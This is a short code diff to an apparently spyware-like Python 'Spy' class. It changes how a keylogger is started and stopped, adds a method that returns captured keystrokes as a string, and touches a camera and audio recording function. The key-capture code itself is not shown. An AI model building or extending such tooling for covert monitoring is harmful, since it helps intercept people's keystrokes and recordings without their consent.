@@ -40,14 +40,21 @@ class Spy:
         if self.keyLogger:
             return False
         self.keyLogger = KeyLogger()
-        self.keyLogger.start()
-        return True
+        return self.keyLogger.start()
 
     def stop_keylogger(self) -> bool:
         if not self.keyLogger:
             return False
-        self.keyLogger.stop()
-        return True
+        r = self.keyLogger.stop()
+        self.keyLogger = None
+        return r
+
+    def get_keyLogger(self) -> str:
+        if self.keyLogger:
+            return ", ".join(list(self.keyLogger.keys.queue))
+
+    def is_keyLogGer_runs(self):
+        return self.keyLogger is not None
 
     def start_video_audio_record(self, camindex=None) -> bool:
         if self.audio_recorder or self.audio_recorder:
